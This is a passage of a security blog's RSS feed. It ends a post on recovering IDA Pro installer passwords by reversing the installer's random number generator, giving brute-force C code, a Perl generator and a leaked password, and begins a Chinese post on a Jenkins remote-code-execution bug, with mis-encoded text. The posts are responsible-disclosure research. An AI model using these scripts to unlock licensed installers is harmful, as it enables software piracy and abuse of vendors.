        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a month, we finally generated the IDA Pro installation passwords successfully with Perl, and the correct charset ordering is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&lt;/code&gt;. For example, we can generate the hacking teamâ€™s leaked password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FgVQyXZY2XFk&lt;/code&gt; with the following script:&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env perl&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;@_e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;split&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3326487116&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;&quot;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$pw&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With this, we can build a dictionary of installation password, which effectively increase the efficiency of brute force attack. Generally, we can compute the password of one installer in 10 minutes.&lt;/p&gt;

&lt;p&gt;We have reported this issue to Hex-Rays, and they promised to harden the installation password immediately.&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;In this article, we discussed the possibility of installing IDA Pro without owning installation password. In the end, we found plaintext password in the program memory of Linux and MacOS version. On the other hand, we determined the password generation methodology of Windows version. Therefore, we can build a dictionary to accelerate brute force attack. Finally, we can get one password at a reasonable time.&lt;/p&gt;

&lt;p&gt;We really enjoy this process: surmise wisely and prove it with our best. It can broaden our experience no matter the result is correct or not. This is why we took a whole month to verify such a difficult surmise. We also take this attitude in our &lt;a href=&quot;https://devco.re/en/services/red-team/&quot;&gt;Red Team Assessment&lt;/a&gt;. You would love to give it a try!&lt;/p&gt;

&lt;p&gt;Lastly, we would like to thank for the friendly and rapid response from Hex-Rays. Although this issue is not included in &lt;a href=&quot;https://www.hex-rays.com/bugbounty.shtml&quot;&gt;Security Bug Bounty Program&lt;/a&gt;, they still generously awarded us IDA Pro Linux and MAC version, and upgraded the Windows version for us. We really appreciate it.&lt;/p&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Jan 31, 2019 - Report to Hex-Rays&lt;/li&gt;
  &lt;li&gt;Feb 01, 2019 - Hex-Rays promised to harden the installation password and reported to BitRock&lt;/li&gt;
  &lt;li&gt;Feb 11, 2019 - BitRock released InstallBuilder 19.2.0&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/</link>
                <guid>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en</guid>
                <pubDate>Fri, 21 Jun 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å—¨! å¤§å®¶ä»Šå¤©éå¾—å¥½å—?&lt;/p&gt;

&lt;p&gt;é€™ç¯‡æ–‡ç« æ˜¯ Hacking Jenkins ç³»åˆ—çš„ä¸‹é›†! çµ¦é‚£äº›é‚„æ²’çœ‹éä¸Šç¯‡æ–‡ç« çš„åŒå­¸ï¼Œå¯ä»¥è¨ªå•ä¸‹é¢éˆçµï¼Œè£œå……ä¸€äº›åŸºæœ¬çŸ¥è­˜åŠäº†è§£ä¹‹å‰å¦‚ä½•å¾ Jenkins ä¸­çš„å‹•æ…‹è·¯ç”±æ©Ÿåˆ¶åˆ°ä¸²å‡ºå„ç¨®ä¸åŒçš„æ”»æ“Šéˆ!&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1 - Play with Dynamic Routing
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¦‚ä¸Šç¯‡æ–‡ç« æ‰€èªªï¼Œç‚ºäº†æœ€å¤§ç¨‹åº¦ç™¼æ®æ¼æ´çš„æ•ˆæœï¼Œæƒ³å°‹æ‰¾ä¸€å€‹ä»£ç¢¼åŸ·è¡Œçš„æ¼æ´å¯ä»¥èˆ‡ ACL ç¹éæ¼æ´æ­é…ï¼Œæˆç‚ºä¸€å€‹ä¸ç”¨èªè­‰çš„é ç«¯ä»£ç¢¼åŸ·è¡Œ! ä¸éåœ¨æœ€åˆçš„å˜—è©¦ä¸­å¤±æ•—äº†ï¼Œç”±æ–¼å‹•æ…‹è·¯ç”±æ©Ÿåˆ¶çš„ç‰¹æ€§ï¼ŒJenkins åœ¨é‡åˆ°ä¸€äº›å±éšªæ“ä½œæ™‚(å¦‚ &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;)éƒ½æœƒå†æ¬¡çš„æª¢æŸ¥æ¬Šé™! å°è‡´å°±ç®—å¯ä»¥ç¹éæœ€å‰é¢çš„ ACL å±¤ä¾ç„¶ç„¡æ³•åšå¤ªå¤šäº‹æƒ…!&lt;/p&gt;

&lt;p&gt;ç›´åˆ° Jenkins åœ¨ 2018-12-05 ç™¼ä½ˆçš„ &lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;Security Advisory&lt;/a&gt; ä¿®å¾©äº†å‰è¿°æˆ‘æ‰€å›å ±çš„å‹•æ…‹è·¯ç”±æ¼æ´! ç‚ºäº†é–‹å§‹æ’°å¯«é€™ä»½æŠ€è¡“æ–‡ç« (Hacking Jenkins ç³»åˆ—æ–‡)ï¼Œæˆ‘é‡æ–°è¤‡ç¿’äº†ä¸€æ¬¡ç•¶åˆé€²è¡Œä»£ç¢¼å¯©æŸ¥çš„ç­†è¨˜ï¼Œç•¶ä¸­å°å…¶ä¸­ä¸€å€‹è·³æ¿(gadget)æƒ³åˆ°äº†ä¸€å€‹ä¸ä¸€æ¨£çš„åˆ©ç”¨æ–¹å¼ï¼Œå› è€Œæœ‰äº†é€™ç¯‡æ•…äº‹! é€™ä¹Ÿæ˜¯è¿‘æœŸæˆ‘æ‰€å¯«éè¦ºå¾—æ¯”è¼ƒæœ‰è¶£çš„æ¼æ´ä¹‹ä¸€ï¼Œéå¸¸æ¨è–¦å¯ä»¥ä»”ç´°é–±è®€ä¸€ä¸‹!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;æ¼æ´åˆ†æ&quot;&gt;æ¼æ´åˆ†æ&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;è¦è§£é‡‹é€™æ¬¡çš„æ¼æ´ &lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266&quot;&gt;CVE-2019-1003000&lt;/a&gt; å¿…é ˆè¦å¾ Pipeline é–‹å§‹è¬›èµ·! å¤§éƒ¨åˆ†é–‹ç™¼è€…æœƒé¸æ“‡ Jenkins ä½œç‚º CI/CD ä¼ºæœå™¨çš„å…¶ä¸­ä¸€å€‹åŸå› æ˜¯å› ç‚º Jenkins æä¾›äº†ä¸€å€‹å¾ˆå¼·å¤§çš„ Pipeline åŠŸèƒ½ï¼Œä½¿é–‹ç™¼è€…å¯ä»¥æ–¹ä¾¿çš„å»æ’°å¯«ä¸€äº› Build Script ä»¥å®Œæˆè‡ªå‹•åŒ–çš„ç·¨è­¯ã€æ¸¬è©¦åŠç™¼ä½ˆ! ä½ å¯ä»¥æƒ³åƒ Pipeline å°±æ˜¯ä¸€å€‹å°å°çš„å¾®èªè¨€å¯ä»¥å»å° Jenkins é€²è¡Œæ“ä½œ(è€Œå¯¦éš›ä¸Š Pipeline æ˜¯åŸºæ–¼ Groovy çš„ä¸€å€‹ DSL)&lt;/p&gt;

&lt;p&gt;ç‚ºäº†æª¢æŸ¥ä½¿ç”¨è€…æ‰€æ’°å¯«çš„ Pipeline Script æœ‰æ²’æœ‰èªæ³•ä¸Šçš„éŒ¯èª¤(Syntax Error)ï¼ŒJenkins æä¾›äº†ä¸€å€‹ä»‹é¢çµ¦ä½¿ç”¨è€…æª¢æŸ¥è‡ªå·±çš„ Pipeline! é€™è£¡ä½ å¯ä»¥æƒ³åƒä¸€ä¸‹ï¼Œå¦‚æœä½ æ˜¯ç¨‹å¼è¨­è¨ˆå¸«ï¼Œä½ è¦å¦‚ä½•å»å®Œæˆé€™å€‹åŠŸèƒ½å‘¢? ä½ å¯ä»¥è‡ªå·±å¯¦ç¾ä¸€å€‹èªæ³•æ¨¹(AST, Abstract Syntax Tree)è§£æå™¨å»å®Œæˆé€™ä»¶äº‹ï¼Œä¸éé€™å¤ªç´¯äº†ï¼Œæœ€ç°¡å–®çš„æ–¹å¼ç•¶ç„¶æ˜¯å¥—ç”¨ç¾æˆçš„æ±è¥¿!&lt;/p&gt;

&lt;p&gt;å‰é¢æåˆ°ï¼ŒPipeline æ˜¯åŸºæ–¼ Groovy æ‰€å¯¦ç¾çš„ä¸€å€‹ DSLï¼Œæ‰€ä»¥ Pipeline å¿…å®šä¹Ÿéµå®ˆè‘— Groovy çš„èªæ³•! æ‰€ä»¥æœ€ç°¡å–®çš„æ–¹å¼æ˜¯ï¼Œåªè¦ Groovy å¯ä»¥æˆåŠŸè§£æ(parse)ï¼Œé‚£å°±ä»£è¡¨é€™ä»½ Pipeline çš„èªæ³•ä¸€å®šæ˜¯å°çš„! Jenkins å¯¦ä½œæª¢æŸ¥çš„ç¨‹å¼ç¢¼ç´„æ˜¯ä¸‹é¢é€™æ¨£å­:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;JSON&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;doCheckScriptCompile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@QueryParameter&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;CpsGroovyShell&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;forTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;withParent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;CompilationFailedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
